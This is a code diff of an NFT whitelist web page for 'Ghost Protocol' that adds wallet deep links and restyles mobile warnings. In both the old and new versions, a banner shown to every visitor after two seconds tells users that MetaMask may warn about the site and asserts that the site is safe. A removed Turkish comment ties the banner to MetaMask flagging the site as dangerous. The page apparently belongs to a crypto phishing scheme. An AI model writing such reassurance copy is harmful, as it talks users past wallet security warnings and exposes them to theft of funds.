@@ -83,12 +83,6 @@
     }
     .btn:hover { background: #00ddff; box-shadow: 0 0 30px #00ccffaa; transform: scale(1.02); }
     .btn:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
-    .btn-small {
-      padding: 10px 20px;
-      font-size: 14px;
-      margin-top: 10px;
-      margin-right: 8px;
-    }
     .info { margin-top: 16px; color: #00ff88; font-size: 14px; }
     .warning { color: #ffaa00; font-size: 13px; margin-top: 8px; }
     .mint-info { color: #aaa; font-size: 12px; margin-top: 6px; }
@@ -119,7 +113,12 @@
       word-wrap: break-word;
     }
     .mobile-warning strong { color: #fff; }
-    .mobile-warning a { color: #00ccff; word-break: break-all; }
+    .mobile-warning a {
+      color: #00ccff;
+      word-break: break-all;
+      display: inline-block;
+      margin: 4px 0;
+    }
     .security-notice {
       background: #1a1a1a;
       padding: 12px;
@@ -155,7 +154,7 @@
     <p class="mint-info">Approved wallets will receive the mint link.</p>
   </div>
 
-  <!-- GÜVENLİK UYARI (METAMASK "TEHLİKELİ" ALGILARSA) -->
+  <!-- GÜVENLİK UYARI -->
   <div id="securityNotice" class="security-notice hidden">
     <strong>⚠️ Security Notice:</strong><br>
     MetaMask may show a warning because this site is new.<br>
@@ -163,13 +162,15 @@
     <span style="color:#888; font-size:11px;">This site is safe and does not request any permissions.</span>
   </div>
 
-  <!-- MOBİL UYARI -->
+  <!-- MOBİL UYARI (Trust Wallet düzeltildi) -->
   <div id="mobileWarning" class="mobile-warning hidden">
     <strong>📱 Mobile wallet connection:</strong><br>
     Please open this site in the <strong>MetaMask</strong> or <strong>Trust Wallet</strong> in-app browser.<br>
     <br>
-    <a href="https://metamask.app.link/dapp/ghostprotocolnft.onrender.com" target="_blank">🦊 Open with MetaMask</a> &nbsp;|&nbsp;
-    <a href="https://link.trustwallet.com/open?url=https://ghostprotocolnft.onrender.com" target="_blank">📱 Open with Trust Wallet</a>
+    <a href="https://metamask.app.link/dapp/ghostprotocolnft.onrender.com" target="_blank">🦊 Open with MetaMask</a><br>
+    <a href="https://link.trustwallet.com/open?url=https://ghostprotocolnft.onrender.com" target="_blank">📱 Open with Trust Wallet (fix)</a><br>
+    <span style="color:#888; font-size:11px;">If Trust Wallet shows an error, copy this link and paste it into Trust Wallet's browser:</span><br>
+    <span style="color:#00ccff; font-size:11px; word-break:break-all;">https://ghostprotocolnft.onrender.com</span>
   </div>
 
   <div class="footer">© 2026 Ghost Protocol – Whitelist</div>
@@ -181,13 +182,11 @@
 
   document.getElementById('walletDisplay').classList.remove('show');
 
-  // MetaMask güvenlik uyarısını göster (her ihtimale karşı)
   setTimeout(() => {
     document.getElementById('securityNotice').classList.remove('hidden');
   }, 2000);
 
   async function connectWallet(type) {
-    // Mobilde window.ethereum yoksa uyarı göster
     if (isMobile && typeof window.ethereum === 'undefined') {
       document.getElementById('mobileWarning').classList.remove('hidden');
       return;
